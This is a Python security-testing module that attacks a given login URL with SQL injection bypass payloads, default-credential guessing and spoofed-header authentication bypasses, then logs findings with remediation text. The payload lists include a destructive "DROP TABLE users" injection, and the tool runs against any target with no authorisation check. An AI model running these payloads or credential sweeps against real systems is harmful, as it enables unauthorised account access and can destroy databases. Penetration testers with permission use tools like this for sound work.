#!/usr/bin/env python3
"""
Login Bypass testing module.

Usage:
    python login_bypass.py --target https://example.com/login --output results/
"""

import argparse
import asyncio
import json
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.http_client import AsyncHTTPClient, HTTPResponse
from core.result_manager import ResultManager, ScanResult, Finding, Severity
from core.utils import setup_logging, load_config, normalize_url, extract_domain, timestamp_now, ensure_dir

logger = setup_logging("login_bypass")


@dataclass
class LoginBypassVuln:
    """Represents a login bypass vulnerability."""

    url: str
    vuln_type: str
    method: str
    description: str
    payload: str
    evidence: str
    confidence: str = "medium"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "vuln_type": self.vuln_type,
            "method": self.method,
            "description": self.description,
            "payload": self.payload,
            "evidence": self.evidence[:500] if self.evidence else "",
            "confidence": self.confidence,
        }


class LoginBypassTester:
    """
    Login Bypass vulnerability tester.

    Features:
    - SQL injection in login forms
    - Default credential testing
    - Authentication logic bypass
    - Response manipulation detection
    - Rate limiting bypass
    """

    SQL_BYPASS_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "admin'--",
        "admin'/*",
        "' OR 1=1--",
        "' OR 1=1#",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "' OR ''='",
        "1' OR '1'='1",
        "' UNION SELECT 1,1,1--",
        "admin' AND '1'='1",
        "' OR 'x'='x",
        "' OR username LIKE '%",
        "'; DROP TABLE users--",
        "' OR 1=1 LIMIT 1--",
        "admin'#",
        "' OR EXISTS(SELECT 1)--",
        "' OR 1 IN (1)--",
    ]

    DEFAULT_CREDENTIALS = [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "123456"),
        ("admin", "admin123"),
        ("administrator", "administrator"),
        ("root", "root"),
        ("root", "toor"),
        ("test", "test"),
        ("user", "user"),
        ("guest", "guest"),
        ("demo", "demo"),
        ("admin", ""),
        ("", ""),
        ("sa", ""),
        ("admin", "changeme"),
        ("admin", "admin@123"),
    ]

    AUTH_BYPASS_HEADERS = [
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Real-IP", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("X-Remote-IP", "127.0.0.1"),
        ("X-Remote-Addr", "127.0.0.1"),
        ("X-Client-IP", "127.0.0.1"),
        ("X-Host", "127.0.0.1"),
        ("X-Forwarded-Host", "127.0.0.1"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
        ("X-Override-URL", "/admin"),
    ]

    def __init__(
        self,
        target: str,
        output_dir: str = "results",
        config: Optional[Dict] = None,
        proxy: Optional[str] = None,
        timeout: int = 30,
        username_field: str = "username",
        password_field: str = "password",
        verbose: bool = False,
    ):
        self.target = normalize_url(target)
        self.target_domain = extract_domain(target)
        self.output_dir = Path(output_dir)
        self.config = config or {}
        self.proxy = proxy
        self.timeout = timeout
        self.username_field = username_field
        self.password_field = password_field
        self.verbose = verbose

        self.vulnerabilities: List[LoginBypassVuln] = []
        self.result_manager = ResultManager(output_dir)
        ensure_dir(self.output_dir)

        self.baseline_response: Optional[HTTPResponse] = None
        self.baseline_failed_length: int = 0

    async def test(self) -> ScanResult:
        """Run login bypass tests."""
        result = ScanResult(
            tool="login_bypass",
            target=self.target,
            config={"timeout": self.timeout},
        )

        logger.info(f"Starting login bypass testing for: {self.target}")

        try:
            # Get baseline failed login response
            await self._get_baseline()

            # Test SQL injection bypass
            await self._test_sql_bypass()

            # Test default credentials
            await self._test_default_creds()

            # Test header-based bypass
            await self._test_header_bypass()

            # Test response manipulation
            await self._test_response_manipulation()

            result.stats = {
                "vulnerabilities_found": len(self.vulnerabilities),
                "sql_payloads_tested": len(self.SQL_BYPASS_PAYLOADS),
                "default_creds_tested": len(self.DEFAULT_CREDENTIALS),
            }

            for vuln in self.vulnerabilities:
                severity = Severity.CRITICAL if vuln.confidence == "high" else Severity.HIGH

                result.add_finding(Finding(
                    title=f"Login Bypass: {vuln.vuln_type}",
                    severity=severity,
                    description=vuln.description,
                    url=vuln.url,
                    evidence=vuln.evidence,
                    metadata={"payload": vuln.payload},
                    cwe_id="CWE-287",
                    remediation="Implement proper authentication controls. Use parameterized queries and strong password policies.",
                ))

        except Exception as e:
            result.add_error(f"Testing error: {e}")
            logger.error(f"Testing error: {e}")

        result.finalize()
        return result

    async def _get_baseline(self):
        """Get baseline failed login response."""
        logger.info("Getting baseline failed login response...")

        async with AsyncHTTPClient(timeout=self.timeout, proxy=self.proxy) as client:
            # Try a definitely-wrong login
            response = await client.post(
                self.target,
                data={
                    self.username_field: "nonexistent_user_12345",
                    self.password_field: "wrong_password_67890",
                }
            )
            self.baseline_response = response
            self.baseline_failed_length = len(response.body)
            logger.debug(f"Baseline response length: {self.baseline_failed_length}")

    async def _test_sql_bypass(self):
        """Test SQL injection login bypass."""
        logger.info("Testing SQL injection bypass...")

        async with AsyncHTTPClient(timeout=self.timeout, proxy=self.proxy) as client:
            for payload in self.SQL_BYPASS_PAYLOADS:
                try:
                    response = await client.post(
                        self.target,
                        data={
                            self.username_field: payload,
                            self.password_field: payload,
                        }
                    )

                    if self._is_successful_login(response):
                        vuln = LoginBypassVuln(
                            url=self.target,
                            vuln_type="sql_injection_bypass",
                            method="POST",
                            description=f"SQL injection bypass successful with payload",
                            payload=payload,
                            evidence=response.body[:300],
                            confidence="high",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found SQL bypass: {payload}")
                        return  # One success is enough

                except Exception as e:
                    logger.debug(f"Error testing SQL payload: {e}")

    async def _test_default_creds(self):
        """Test default credentials."""
        logger.info("Testing default credentials...")

        async with AsyncHTTPClient(timeout=self.timeout, proxy=self.proxy) as client:
            for username, password in self.DEFAULT_CREDENTIALS:
                try:
                    response = await client.post(
                        self.target,
                        data={
                            self.username_field: username,
                            self.password_field: password,
                        }
                    )

                    if self._is_successful_login(response):
                        vuln = LoginBypassVuln(
                            url=self.target,
                            vuln_type="default_credentials",
                            method="POST",
                            description=f"Default credentials work: {username}:{password}",
                            payload=f"{username}:{password}",
                            evidence=response.body[:300],
                            confidence="high",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found default creds: {username}:{password}")

                except Exception as e:
                    logger.debug(f"Error testing credentials: {e}")

    async def _test_header_bypass(self):
        """Test header-based authentication bypass."""
        logger.info("Testing header-based bypass...")

        async with AsyncHTTPClient(timeout=self.timeout, proxy=self.proxy) as client:
            for header_name, header_value in self.AUTH_BYPASS_HEADERS:
                try:
                    # Test accessing protected resource directly with bypass headers
                    response = await client.get(
                        self.target,
                        headers={header_name: header_value}
                    )

                    # Check if we got different response than normal
                    if response.status == 200 and len(response.body) != self.baseline_failed_length:
                        if self._looks_like_authenticated(response.body):
                            vuln = LoginBypassVuln(
                                url=self.target,
                                vuln_type="header_bypass",
                                method="GET",
                                description=f"Auth bypass via {header_name} header",
                                payload=f"{header_name}: {header_value}",
                                evidence=response.body[:300],
                                confidence="medium",
                            )
                            self.vulnerabilities.append(vuln)
                            logger.info(f"Found header bypass: {header_name}")

                except Exception as e:
                    logger.debug(f"Error testing header bypass: {e}")

    async def _test_response_manipulation(self):
        """Test for client-side authentication validation."""
        logger.info("Testing response manipulation indicators...")

        async with AsyncHTTPClient(timeout=self.timeout, proxy=self.proxy) as client:
            response = await client.post(
                self.target,
                data={
                    self.username_field: "test",
                    self.password_field: "test",
                }
            )

            # Check for client-side validation indicators
            indicators = [
                'success": false',
                '"authenticated": false',
                '"valid": false',
                '"status": "failed"',
                '"result": false',
                'isLoggedIn = false',
                'authenticated = false',
            ]

            body_lower = response.body.lower()
            for indicator in indicators:
                if indicator.lower() in body_lower:
                    vuln = LoginBypassVuln(
                        url=self.target,
                        vuln_type="client_side_auth",
                        method="POST",
                        description="Response indicates client-side authentication check - may be bypassable",
                        payload="Response contains mutable auth flag",
                        evidence=f"Found indicator: {indicator}",
                        confidence="low",
                    )
                    self.vulnerabilities.append(vuln)
                    logger.info(f"Found client-side auth indicator: {indicator}")
                    break

    def _is_successful_login(self, response: HTTPResponse) -> bool:
        """Check if login was successful based on response."""
        # Check status code
        if response.status in [301, 302, 303, 307, 308]:
            # Redirect often indicates successful login
            location = response.headers.get("location", "").lower()
            if any(x in location for x in ["dashboard", "home", "welcome", "profile", "admin"]):
                return True

        # Check response content
        if response.status == 200:
            body_lower = response.body.lower()

            # Positive indicators
            success_indicators = [
                "welcome",
                "dashboard",
                "logout",
                "profile",
                "account",
                '"success": true',
                '"authenticated": true',
                "login successful",
                "logged in",
            ]

            # Negative indicators (failed login)
            failure_indicators = [
                "invalid",
                "incorrect",
                "failed",
                "error",
                "wrong password",
                "authentication failed",
                "access denied",
            ]

            has_success = any(ind in body_lower for ind in success_indicators)
            has_failure = any(ind in body_lower for ind in failure_indicators)

            # Check response length difference
            length_diff = abs(len(response.body) - self.baseline_failed_length)
            significant_diff = length_diff > 100

            return has_success and not has_failure and significant_diff

        return False

    def _looks_like_authenticated(self, body: str) -> bool:
        """Check if response looks like authenticated access."""
        indicators = ["dashboard", "admin", "settings", "profile", "logout", "welcome"]
        body_lower = body.lower()
        return any(ind in body_lower for ind in indicators)

    def save_results(self, result: ScanResult) -> Dict[str, str]:
        """Save results to files."""
        paths = self.result_manager.save(result, f"login_bypass_{self.target_domain}")

        vuln_path = self.output_dir / f"login_bypass_vulns_{self.target_domain}.json"
        with open(vuln_path, "w") as f:
            json.dump({
                "target": self.target,
                "timestamp": timestamp_now(),
                "vulnerabilities": [v.to_dict() for v in self.vulnerabilities],
            }, f, indent=2)
        paths["vulnerabilities"] = str(vuln_path)

        return paths


async def main():
    parser = argparse.ArgumentParser(description="Login Bypass tester")
    parser.add_argument("-t", "--target", required=True, help="Target login URL")
    parser.add_argument("-o", "--output", default="results", help="Output directory")
    parser.add_argument("--username-field", default="username", help="Username field name")
    parser.add_argument("--password-field", default="password", help="Password field name")
    parser.add_argument("-p", "--proxy", help="Proxy URL")
    parser.add_argument("-v", "--verbose", action="store_true")

    args = parser.parse_args()

    tester = LoginBypassTester(
        target=args.target,
        output_dir=args.output,
        proxy=args.proxy,
        username_field=args.username_field,
        password_field=args.password_field,
        verbose=args.verbose,
    )

    result = await tester.test()
    paths = tester.save_results(result)

    print(f"\n{'='*60}")
    print(f"Login Bypass Testing Complete")
    print(f"{'='*60}")
    print(f"Vulnerabilities: {len(tester.vulnerabilities)}")
    for name, path in paths.items():
        print(f"  {name}: {path}")


if __name__ == "__main__":
    asyncio.run(main())
